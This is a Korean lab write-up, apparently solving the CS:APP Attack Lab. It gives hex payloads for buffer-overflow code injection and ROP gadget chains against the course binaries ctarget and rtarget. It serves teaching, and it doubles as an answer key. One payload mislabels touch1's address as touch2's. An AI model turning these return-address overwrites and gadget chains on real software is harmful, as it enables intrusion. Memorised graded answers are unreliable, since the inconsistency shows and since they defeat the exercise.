# Attack_Lab  / Solution by BaeJuneHyuck , PNU CSE


## <Phase_1>
Phase1,2,3은 ctarget의 getbuf 실행 후 리턴을 통해touch1,2,3을 실행해야 한다.
제공받은 ctarget을 objdump -d 를 사용하여 역어셈블한 뒤, getbuf를 확인하면 sub $0x28, %rsp를 통해 스택에 40바이트를 할당함을 확인할 수 있다. 그렇다면 우리의 목적인 touch1에 접근하기 위해서는 할당 받은 40바이트를 넘어 touch1의 주소를 입력하여 return address를 수정하면 된다. touch1의 주소는 0x401915이며 Byte ordering에 따라서 15 19 40 00 00 00 00 00 을 주소로 입력해주었다. 

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* 40바이트 채우기 */
15 19 40 00 00 00 00 00 /* touch1의 주소 */
```
위의 내용을 exploit.txt로 생성한 뒤, cat exploit1.txt | ./hex2raw | ./ctarget 을 실행하여
Phase1을 성공적으로 수행하였다.

## <Phase_2>
Phase2에서는 getbuf이후 touch2를 실행하되 인자로 자신의 cookie값을 전달해야 한다. 따라서, touch2의 인자를 조작하기 위하여 mov $0x232add1b, %rdi 가 실행되고, 그 다음 retq 를 통해 touch2로 Instruction Pointer가 이동해야 한다. gets의 입력으로 이를 위한 바이트 코드를 입력하고 리턴 어드레스를 입력 버퍼의 주소로 설정하면, 해당 코드가 실행되도록 할 수 있다. 위의 어셈블리 코드를 phase2.s 로 생성하고, gcc -c phase2로 컴파일, objdump -d phase2.o 를 통하여 역어셈블 하면 바이트 코드 48 c7 c7 1b dd 2a 23 / c3 를 얻을 수 있다. 또한, gdb를 통해 retq 실행 직전의 rsp의 값을 x/s %rsp 명령어로 확인, 그 값에서 0x28을 뺀 값이 입력 버퍼의 주소(즉, 첫번째 명령 실행을 위한 주소)이므로 리턴 어드레스를 덮어씌우기 위한 값을 얻게 된다. 마지막으로 retq의 대상이 되는 touch2의 주소를 덧붙인다. 이들을 조합하여 작성하면 다음과 같다.

```
48 c7 c7 1b dd 2a 23 c3 /* mov $0x232add1b(쿠키값), %rdi // retq */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* 나머지 40바이트 채우기 */
88 f8 61 55 00 00 00 00 /* retq 실행 시점의 rsp – 0x28(buf)주소 */
15 19 40 00 00 00 00 00 /* touch2의 주소, 리틀 엔디안 */
 ```
 
## <Phase_3>
 Phase2와 달리 쿠키를 정수 값이 아닌 문자열로 전달해 주어야한다. 
기본적인 방법은 위의 phase2와 비슷하다. 원래 함수의 리턴 주소를 입력 버퍼의 주소(rsp-0x28)로 바꿔서 첫번째 명령(movq)을 실행하도록 하였다. 이때 movq 명령에서 phase2와 달리 쿠키 string이 있는 위치, 즉 retq실행 시점의 rsp + 0x10을 rdi에 저장하고 있다. 이후 첫번째 라인의 리턴(c3)에 의해 touch3가 실행된다. 이를 나타내는 입력은 아래와 같다.

```
48 c7 c7 c0 f8 61 55 c3  /* movq 0x5561f8c0(cookie string의 주소), rdi */ 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* 여기까지 40바이트 */
88 f8 61 55 00 00 00 00 /* retq 실행 시점의 rsp – 0x28(buf)주소 */
52 1a 40 00 00 00 00 00 /* touch 3 주소 */
32 33 32 61 64 64 31 62 /* cookie string */
```

## <Phase_4>
 Phase4, 5는 새로운 실행파일인 rtarget을 실행시켜 ROP를 사용, phase2, 3을 반복한다.
주어진 pdf에서는 2개의 가젯을 이용하여 이를 수행할 수 있고 pop을 이용하여 스택에서 데이터와 가젯의 주소를 사용할 수 있다고 힌트를 주고 있다. 우리가 원하는 동작은 rdi에 쿠키값을 넣고 touch2를 실행하는 것이다. 직접 쿠키의 값을 레지스터에 입력해주는 가젯은 없으니 버퍼 입력을 통해 스택에 쿠키값을 삽입, 입력 되어있는 쿠키를 pop을 사용하여 rdi에 저장해주자. 사용중인 rtarget 파일에서는 popq %rdi의 가젯이 존재하지 않아서 popq %rax를 통해 임시로 rax에 저장 후 movq %rax, %rdi를 통해 rdi에 쿠키값을 입력하였다.
 이제 각각의 가젯을 찾아야 하는데 이들의 바이트 코드는 각각 58 / 48 89 c7 이다. Rtarget 내부의 gadget_farm에서 ‘58’을 검색하면 아래와 같은 코드를 찾을 수 있다.

```
0000000000401aef <getval_379>:
  401aef:	b8 1e 58 90 90       	mov    $0x9090581e, %eax
  401af4:	c3                   	retq
```
58 90 90 c3에서 90은 nop로써 원하는 동작을 하는데 영향을 주지 않는다.
따라서 401aef + 3 (offset)으로 popq rax를 사용할 수 있다.  같은 방법으로 movq %rax %rdi의 가젯도 찾을 수 있으며. 이를 통해 작성된 입력은 아래와 같다.

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* 40 바이트 */
f1 1a 40 00 00 00 00 00 /* gadget 1	popq rax */
1b dd 2a 23 00 00 00 00 /* cookie */
f8 1a 40 00 00 00 00 00 /* gadget 2	movq rax rdi */
41 19 40 00 00 00 00 00	/* touch2 의 주소*/
```

## <Phase_5>	
 Phase3에서 사용한 입력들을 가젯을 사용하여 구현하여야 한다. 주어진 pdf는 공식적인 정답은 8개의 가젯을 사용한다고 말해주고 있는데 이를 통해phase_3에서 사용한 movq와 retq가 여러 가젯을 사용하여 구현될 것 임을 알 수 있다. 
먼저 rdi에 쿠키의 주소를 입력해 주어야 하는데, 역시나 이를 직접 수행할 수는 없으며, 직접 버퍼 입력으로 cookie의 string을 입력해주고 그 주소를 pop을 사용하여 레지스터에 전달해주어야 한다. rsp를 rdi에 저장한 뒤 rsp에서 cookie string까지의 거리 48을 rax에 넣으면 두 값을 더한 값이 바로 쿠키의 주소가 된다. 이를 위한 add_xy가 gadget_farm에 친절하게도 존재하는 것을 확인할 수 있고, 이후 gadget7으로 사용하였다.
 구현을 위하여 여러 가젯이 사용되였다. gadget7의 lea (rdi rsi 1), eax를 사용하기 위해서 rsp의 값은 movq를 통해 rsp -> rax ->rdi 순으로 전달되었으며 쿠키 스트링까지의 거리 48은 popq를 사용하여 rax에 저장된 뒤, rax->edx->ecx->esi순으로 전달되었다. 이 두 값을 lea를 통해 더한 뒤 eax에 저장해주었고 마지막으로 movq rax rdi를 실행하는 가젯을 통하여 쿠키의 주소를 인자(rdi)로 전달, touch3를 실행하였다. 
 특이한 점으로 5번째 가젯의 바이트코드에는 38 c0이 포함 되어있으나 해당 코드가 실행하는 명령인 cmpb는 레지스터에 영향을 주지 않으므로 원하는 기능을 수행하는데 아무 문제가 되지 않는다. 이를 모두 구현한 입력은 아래와 같다. 

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* 40 바이트 */
3f 1b 40 00 00 00 00 00 /* gadget1, movq rsp rax */
f8 1a 40 00 00 00 00 00 /* gadget2, movq rax rdi */
f1 1a 40 00 00 00 00 00 /* gadget3, popq rax */
48 00 00 00 00 00 00 00 /* gap between gadget1 and cookie */
39 1b 40 00 00 00 00 00 /* gadget4, movl eax edx */
8b 1b 40 00 00 00 00 00 /* gadget5, movl edx ecx */ 
a2 1b 40 00 00 00 00 00 /* gadget6, movl ecx */
2a 1b 40 00 00 00 00 00 /* gadget7, lea (rdi rsi 1) eax */
f8 1a 40 00 00 00 00 00 /* gadget8, movq rax */
52 1a 40 00 00 00 00 00 /* touch 3 주소 */
32 33 32 61 64 64 31 62 /* cookie string */
00 00 00 00 00 00 00 00 /* string end */
```
